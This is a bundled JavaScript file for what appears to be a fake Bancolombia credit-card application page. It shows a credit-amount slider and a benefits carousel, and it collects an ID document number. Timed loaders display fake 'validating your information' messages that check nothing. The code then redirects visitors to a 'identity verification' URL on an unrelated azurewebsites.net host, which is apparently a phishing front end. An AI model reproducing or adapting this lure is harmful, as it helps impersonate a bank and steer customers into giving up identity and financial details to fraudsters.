(() => {
  var __getOwnPropNames = Object.getOwnPropertyNames;
  var __esm = (fn, res, err) => function __init() {
    if (err) throw err[0];
    try {
      return fn && (res = (0, fn[__getOwnPropNames(fn)[0]])(fn = 0)), res;
    } catch (e) {
      throw err = [e], e;
    }
  };
  var __commonJS = (cb, mod) => function __require() {
    try {
      return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
    } catch (e) {
      throw mod = 0, e;
    }
  };

  // assets/js/core/config.js
  var APP_CONFIG;
  var init_config = __esm({
    "assets/js/core/config.js"() {
      APP_CONFIG = {
        carouselAutoPlayMs: 3e3,
        identityVerificationUrl: "https://sistema363-b9cycud9b8fkaucs.centralus-01.azurewebsites.net/",
        loaders: {
          applyDelayMs: 1400,
          validationLabelDelayMs: 850,
          validationCompleteDelayMs: 1600,
          redirectDelayMs: 1400
        },
        benefitSlides: [
          {
            title: "Casillero virtual",
            text: "Compra por Internet en Estados Unidos y recibe tus articulos en Colombia.",
            icon: "far fa-star",
            iconImage: "assets/images/icono-caja.svg"
          },
          {
            title: "Salas VIP Avianca",
            text: "Presenta tu tarjeta de credito y accede a las salas VIP de Avianca en Colombia",
            icon: "far fa-gem",
            iconImage: "assets/images/diamantito.svg"
          },
          {
            title: "Afiliaci\xF3n de pagos",
            text: "Cambia tu tarjeta vencida o da\xF1ada y tus datos se actualizar\xE1n para pagos de suscripciones.",
            icon: "far fa-calendar-alt",
            iconImage: "assets/images/calendario.svg"
          },
          {
            title: "Paga con Mastercard",
            text: "Disfruta de beneficios exclusivos para tu dia a dia pagando con tus tarjetas Mastercard Bancolombia.",
            icon: "far fa-credit-card",
            iconImage: "assets/images/pago-alegre.png"
          }
        ]
      };
    }
  });

  // assets/js/core/state.js
  function createAppState() {
    return {
      loadingTimeoutId: void 0,
      loadingStageTimeoutId: void 0
    };
  }
  var init_state = __esm({
    "assets/js/core/state.js"() {
    }
  });

  // assets/js/utils/dom.js
  function $(selector, root = document) {
    return root.querySelector(selector);
  }
  function $$(selector, root = document) {
    return Array.from(root.querySelectorAll(selector));
  }
  function showFlex(element) {
    if (!element) {
      return;
    }
    element.classList.remove("hidden");
    element.classList.add("flex");
  }
  function hideFlex(element) {
    if (!element) {
      return;
    }
    element.classList.add("hidden");
    element.classList.remove("flex");
  }
  function scrollToTop() {
    window.scrollTo({ top: 0, left: 0, behavior: "auto" });
  }
  var init_dom = __esm({
    "assets/js/utils/dom.js"() {
    }
  });

  // assets/js/utils/analytics.js
  function trackEvent(name, payload = {}) {
    const detail = { name, ...payload };
    if (Array.isArray(window.dataLayer)) {
      window.dataLayer.push(detail);
    }
    document.dispatchEvent(new CustomEvent("app:track", { detail }));
  }
  var init_analytics = __esm({
    "assets/js/utils/analytics.js"() {
    }
  });

  // assets/js/modules/components/Slider.js
  function formatCurrency(valueInMillions) {
    const value = Number(valueInMillions) * 1e6;
    return value.toLocaleString("es-CO", {
      style: "currency",
      currency: "COP",
      maximumFractionDigits: 0
    });
  }
  function createSlider({ slider, amount, label, progress }) {
    function updateUI() {
      if (!slider || !amount || !label || !progress) {
        return;
      }
      const min = Number(slider.min);
      const max = Number(slider.max);
      const value = Number(slider.value);
      const percentage = (value - min) / (max - min) * 100;
      amount.textContent = formatCurrency(value);
      label.textContent = `Cupo seleccionado para tu solicitud: ${formatCurrency(value)}`;
      progress.style.width = `${percentage}%`;
    }
    function init() {
      slider?.addEventListener("input", updateUI);
      updateUI();
    }
    return {
      init,
      updateUI
    };
  }
  var init_Slider = __esm({
    "assets/js/modules/components/Slider.js"() {
    }
  });

  // assets/js/modules/components/Carousel.js
  function createCarousel({ slides, autoPlayMs, elements }) {
    const {
      title1,
      text1,
      icon1,
      icon1Image,
      title2,
      text2,
      icon2,
      icon2Image,
      title1Mobile,
      text1Mobile,
      icon1Mobile,
      icon1MobileImage,
      prevButton,
      nextButton,
      prevDesktopButton,
      nextDesktopButton,
      dots
    } = elements;
    let activeSlideIndex = 0;
    let autoPlayId;
    let isBound = false;
    function setIconVisual(iconElement, imageElement, slideItem, imageClasses) {
      if (!iconElement) {
        return;
      }
      if (slideItem.iconImage && imageElement) {
        imageElement.src = slideItem.iconImage;
        imageElement.className = imageClasses;
        imageElement.removeAttribute("hidden");
        iconElement.className = "hidden";
        return;
      }
      if (imageElement) {
        imageElement.className = "hidden";
      }
      iconElement.className = slideItem.icon || "hidden";
    }
    function setSlide(index) {
      const current = slides[index];
      if (!current) {
        return;
      }
      activeSlideIndex = index;
      const secondaryIndex = (index + 1) % slides.length;
      const secondary = slides[secondaryIndex];
      if (title1) {
        title1.textContent = current.title;
      }
      if (text1) {
        text1.textContent = current.text;
      }
      setIconVisual(icon1, icon1Image, current, "h-12 w-12 object-contain");
      if (title2) {
        title2.textContent = secondary.title;
      }
      if (text2) {
        text2.textContent = secondary.text;
      }
      setIconVisual(icon2, icon2Image, secondary, "h-12 w-12 object-contain");
      if (title1Mobile) {
        title1Mobile.textContent = current.title;
      }
      if (text1Mobile) {
        text1Mobile.textContent = current.text;
      }
      setIconVisual(icon1Mobile, icon1MobileImage, current, "h-8 w-8 object-contain");
      dots.forEach((dot, dotIndex) => {
        const isActive = dotIndex === index;
        dot.classList.toggle("bg-[#ffd400]", isActive);
        dot.classList.toggle("opacity-100", isActive);
        dot.classList.toggle("bg-[#111827]", !isActive);
        dot.classList.toggle("opacity-70", !isActive);
        dot.setAttribute("aria-pressed", String(isActive));
      });
    }
    function isReducedMotionPreferred() {
      return typeof window.matchMedia === "function" ? window.matchMedia("(prefers-reduced-motion: reduce)").matches : false;
    }
    function stopAutoPlay() {
      window.clearInterval(autoPlayId);
      autoPlayId = void 0;
    }
    function startAutoPlay() {
      if (slides.length <= 1 || isReducedMotionPreferred() || autoPlayId) {
        return;
      }
      autoPlayId = window.setInterval(() => {
        goNext();
      }, autoPlayMs);
    }
    function restartAutoPlay() {
      stopAutoPlay();
      startAutoPlay();
    }
    function goPrev() {
      const nextIndex = (activeSlideIndex - 1 + slides.length) % slides.length;
      setSlide(nextIndex);
    }
    function goNext() {
      const nextIndex = (activeSlideIndex + 1) % slides.length;
      setSlide(nextIndex);
    }
    function bindEvents() {
      if (isBound) {
        return;
      }
      isBound = true;
      dots.forEach((dot) => {
        dot.addEventListener("click", () => {
          const slideIndex = Number(dot.dataset.slide || 0);
          setSlide(slideIndex);
          restartAutoPlay();
        });
      });
      prevButton?.addEventListener("click", () => {
        goPrev();
        restartAutoPlay();
      });
      nextButton?.addEventListener("click", () => {
        goNext();
        restartAutoPlay();
      });
      prevDesktopButton?.addEventListener("click", () => {
        goPrev();
        restartAutoPlay();
      });
      nextDesktopButton?.addEventListener("click", () => {
        goNext();
        restartAutoPlay();
      });
      const interactiveElements = [
        prevButton,
        nextButton,
        prevDesktopButton,
        nextDesktopButton,
        ...dots
      ].filter(Boolean);
      interactiveElements.forEach((element) => {
        element.addEventListener("pointerenter", stopAutoPlay);
        element.addEventListener("pointerleave", startAutoPlay);
        element.addEventListener("focusin", stopAutoPlay);
        element.addEventListener("focusout", startAutoPlay);
      });
      document.addEventListener("visibilitychange", () => {
        if (document.hidden) {
          stopAutoPlay();
          return;
        }
        startAutoPlay();
      });
    }
    function init() {
      bindEvents();
      setSlide(0);
      startAutoPlay();
    }
    return {
      init,
      setSlide,
      startAutoPlay,
      stopAutoPlay,
      restartAutoPlay,
      getActiveSlideIndex: () => activeSlideIndex
    };
  }
  var init_Carousel = __esm({
    "assets/js/modules/components/Carousel.js"() {
    }
  });

  // assets/js/modules/ui/LoaderController.js
  function createLoaderController({ overlay, textElement }) {
    function setText(message) {
      if (textElement) {
        textElement.textContent = message;
      }
    }
    function show(message = "Cargando...") {
      setText(message);
      showFlex(overlay);
    }
    function hide() {
      hideFlex(overlay);
    }
    return {
      show,
      hide,
      setText
    };
  }
  var init_LoaderController = __esm({
    "assets/js/modules/ui/LoaderController.js"() {
      init_dom();
    }
  });

  // assets/js/modules/ui/ScreenManager.js
  function createScreenManager({
    landingPage,
    postSolicitudPage,
    identityVerificationModal
  }) {
    function showPostSolicitudPage() {
      if (!landingPage || !postSolicitudPage) {
        return;
      }
      landingPage.classList.add("hidden");
      postSolicitudPage.classList.remove("hidden");
      scrollToTop();
    }
    function showLandingPage() {
      if (!landingPage || !postSolicitudPage) {
        return;
      }
      hideIdentityVerificationModal();
      postSolicitudPage.classList.add("hidden");
      landingPage.classList.remove("hidden");
      scrollToTop();
    }
    function showIdentityVerificationModal() {
      showFlex(identityVerificationModal);
    }
    function hideIdentityVerificationModal() {
      hideFlex(identityVerificationModal);
    }
    return {
      showPostSolicitudPage,
      showLandingPage,
      showIdentityVerificationModal,
      hideIdentityVerificationModal
    };
  }
  var init_ScreenManager = __esm({
    "assets/js/modules/ui/ScreenManager.js"() {
      init_dom();
    }
  });

  // assets/js/modules/validators/DocumentValidator.js
  function isValidDocumentNumber(documentNumber) {
    if (!documentNumber) return false;
    const raw = String(documentNumber).replace(/\s+/g, "").trim();
    if (!/^\d{6,12}$/.test(raw)) return false;
    const digitsOnly = raw.replace(/\D/g, "");
    return digitsOnly.length >= 6 && digitsOnly.length <= 12;
  }
  var init_DocumentValidator = __esm({
    "assets/js/modules/validators/DocumentValidator.js"() {
    }
  });

  // assets/js/modules/validators/FormValidator.js
  function canAdvanceForm({ documentNumber, documentType } = {}) {
    if (documentNumber !== void 0) {
      if (!isValidDocumentNumber(documentNumber)) return false;
    }
    if (documentType !== void 0) {
      if (!String(documentType || "").trim()) return false;
    }
    return true;
  }
  var init_FormValidator = __esm({
    "assets/js/modules/validators/FormValidator.js"() {
      init_DocumentValidator();
    }
  });

  // assets/js/modules/ui/FormManager.js
  function createFormManager({
    documentTypeTrigger,
    documentTypeValue,
    documentTypeOptions,
    documentTypeChevron,
    documentTypeOptionButtons,
    documentNumberInput,
    nextButton
  }) {
    function setDocumentOptionsOpen(isOpen) {
      if (!documentTypeOptions || !documentTypeChevron) {
        return;
      }
      documentTypeOptions.classList.toggle("hidden", !isOpen);
      documentTypeChevron.classList.toggle("rotate-180", isOpen);
    }
    function updateNextButton() {
      if (!documentNumberInput || !nextButton) {
        return;
      }
      const hasValue = canAdvanceForm({
        documentNumber: documentNumberInput.value
      });
      nextButton.disabled = !hasValue;
      nextButton.classList.toggle("bg-[#9ca3af]", !hasValue);
      nextButton.classList.toggle("opacity-70", !hasValue);
      nextButton.classList.toggle("bg-[#ffd400]", hasValue);
      nextButton.classList.toggle("text-black", hasValue);
      nextButton.classList.toggle("opacity-100", hasValue);
    }
    function bindEvents() {
      documentTypeTrigger?.addEventListener("click", () => {
        const isClosed = documentTypeOptions?.classList.contains("hidden");
        setDocumentOptionsOpen(Boolean(isClosed));
      });
      documentTypeOptionButtons.forEach((button) => {
        button.addEventListener("click", () => {
          if (documentTypeValue) {
            documentTypeValue.textContent = button.dataset.value || button.textContent || "";
          }
          setDocumentOptionsOpen(false);
        });
      });
      documentNumberInput?.addEventListener("input", updateNextButton);
      document.addEventListener("click", (event) => {
        if (!documentTypeTrigger || !documentTypeOptions) {
          return;
        }
        const target = event.target;
        if (!(target instanceof Element)) {
          return;
        }
        const clickedInsideSelector = documentTypeTrigger.contains(target) || documentTypeOptions.contains(target);
        if (!clickedInsideSelector) {
          setDocumentOptionsOpen(false);
        }
      });
    }
    function init() {
      bindEvents();
      updateNextButton();
    }
    function isNextEnabled() {
      return Boolean(nextButton && !nextButton.disabled);
    }
    function getDocumentType() {
      return documentTypeValue?.textContent?.trim() || "";
    }
    function getDocumentNumber() {
      return documentNumberInput?.value?.trim() || "";
    }
    return {
      init,
      isNextEnabled,
      getDocumentType,
      getDocumentNumber,
      setDocumentOptionsOpen,
      updateNextButton
    };
  }
  var init_FormManager = __esm({
    "assets/js/modules/ui/FormManager.js"() {
      init_FormValidator();
    }
  });

  // assets/js/core/app.js
  var require_app = __commonJS({
    "assets/js/core/app.js"() {
      init_config();
      init_state();
      init_dom();
      init_analytics();
      init_Slider();
      init_Carousel();
      init_LoaderController();
      init_ScreenManager();
      init_FormManager();
      function initApp() {
        const state = createAppState();
        const elements = {
          slider: $("#cupo-slider"),
          amount: $("#selected-amount"),
          label: $("#selected-label"),
          progress: $("#slider-progress"),
          applyButton: $("#apply-button"),
          loadingOverlay: $("#loading-overlay"),
          loadingText: $("#loading-text"),
          landingPage: $("#landing-page"),
          postSolicitudPage: $("#post-solicitud-page"),
          postSolicitudBack: $("#post-solicitud-back"),
          identityVerificationModal: $("#identity-verification-modal"),
          identityVerificationContinue: $("#identity-verification-continue"),
          documentNumberInput: $("#document-number-input"),
          postSolicitudNext: $("#post-solicitud-next"),
          documentTypeTrigger: $("#document-type-trigger"),
          documentTypeValue: $("#document-type-value"),
          documentTypeOptions: $("#document-type-options"),
          documentTypeChevron: $("#document-type-chevron"),
          documentTypeOptionButtons: $$(".document-type-option"),
          carouselDots: $$(".carousel-dot"),
          benefitTitle1: $("#benefit-title-1"),
          benefitText1: $("#benefit-text-1"),
          benefitIcon1: $("#benefit-icon-1"),
          benefitIcon1Image: $("#benefit-icon-1-image"),
          benefitTitle2: $("#benefit-title-2"),
          benefitText2: $("#benefit-text-2"),
          benefitIcon2: $("#benefit-icon-2"),
          benefitIcon2Image: $("#benefit-icon-2-image"),
          benefitTitle1Mobile: $("#benefit-title-1-mobile"),
          benefitText1Mobile: $("#benefit-text-1-mobile"),
          benefitIcon1Mobile: $("#benefit-icon-1-mobile"),
          benefitIcon1MobileImage: $("#benefit-icon-1-mobile-image"),
          benefitPrev: $("#benefit-prev"),
          benefitNext: $("#benefit-next"),
          benefitPrevDesktop: $("#benefit-prev-desktop"),
          benefitNextDesktop: $("#benefit-next-desktop")
        };
        const slider = createSlider({
          slider: elements.slider,
          amount: elements.amount,
          label: elements.label,
          progress: elements.progress
        });
        const loader = createLoaderController({
          overlay: elements.loadingOverlay,
          textElement: elements.loadingText
        });
        const screens = createScreenManager({
          landingPage: elements.landingPage,
          postSolicitudPage: elements.postSolicitudPage,
          identityVerificationModal: elements.identityVerificationModal
        });
        const form = createFormManager({
          documentTypeTrigger: elements.documentTypeTrigger,
          documentTypeValue: elements.documentTypeValue,
          documentTypeOptions: elements.documentTypeOptions,
          documentTypeChevron: elements.documentTypeChevron,
          documentTypeOptionButtons: elements.documentTypeOptionButtons,
          documentNumberInput: elements.documentNumberInput,
          nextButton: elements.postSolicitudNext
        });
        const carousel = createCarousel({
          slides: APP_CONFIG.benefitSlides,
          autoPlayMs: APP_CONFIG.carouselAutoPlayMs,
          elements: {
            title1: elements.benefitTitle1,
            text1: elements.benefitText1,
            icon1: elements.benefitIcon1,
            icon1Image: elements.benefitIcon1Image,
            title2: elements.benefitTitle2,
            text2: elements.benefitText2,
            icon2: elements.benefitIcon2,
            icon2Image: elements.benefitIcon2Image,
            title1Mobile: elements.benefitTitle1Mobile,
            text1Mobile: elements.benefitText1Mobile,
            icon1Mobile: elements.benefitIcon1Mobile,
            icon1MobileImage: elements.benefitIcon1MobileImage,
            prevButton: elements.benefitPrev,
            nextButton: elements.benefitNext,
            prevDesktopButton: elements.benefitPrevDesktop,
            nextDesktopButton: elements.benefitNextDesktop,
            dots: elements.carouselDots
          }
        });
        function clearLoadingTimers() {
          window.clearTimeout(state.loadingTimeoutId);
          window.clearTimeout(state.loadingStageTimeoutId);
          state.loadingTimeoutId = void 0;
          state.loadingStageTimeoutId = void 0;
        }
        slider.init();
        form.init();
        carousel.init();
        elements.applyButton?.addEventListener("click", () => {
          if (elements.applyButton?.hasAttribute("disabled")) {
            return;
          }
          clearLoadingTimers();
          elements.applyButton.setAttribute("disabled", "true");
          loader.show("Cargando...");
          trackEvent("apply_click");
          state.loadingTimeoutId = window.setTimeout(() => {
            loader.hide();
            elements.applyButton?.removeAttribute("disabled");
            screens.showPostSolicitudPage();
          }, APP_CONFIG.loaders.applyDelayMs);
        });
        elements.postSolicitudBack?.addEventListener("click", () => {
          clearLoadingTimers();
          loader.hide();
          screens.showLandingPage();
          trackEvent("post_solicitud_back");
        });
        elements.postSolicitudNext?.addEventListener("click", () => {
          if (!form.isNextEnabled()) {
            return;
          }
          clearLoadingTimers();
          loader.show("Cargando...");
          trackEvent("post_solicitud_next", {
            documentType: form.getDocumentType(),
            hasDocumentNumber: Boolean(form.getDocumentNumber())
          });
          state.loadingStageTimeoutId = window.setTimeout(() => {
            loader.setText("Validando tu informacion");
          }, APP_CONFIG.loaders.validationLabelDelayMs);
          state.loadingTimeoutId = window.setTimeout(() => {
            loader.hide();
            screens.showIdentityVerificationModal();
          }, APP_CONFIG.loaders.validationCompleteDelayMs);
        });
        elements.identityVerificationContinue?.addEventListener("click", () => {
          clearLoadingTimers();
          screens.hideIdentityVerificationModal();
          loader.show("Redireccionando");
          trackEvent("identity_verification_continue");
          state.loadingTimeoutId = window.setTimeout(() => {
            loader.hide();
            window.location.assign(APP_CONFIG.identityVerificationUrl);
          }, APP_CONFIG.loaders.redirectDelayMs);
        });
      }
      if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", initApp);
      } else {
        initApp();
      }
    }
  });
  require_app();
})();
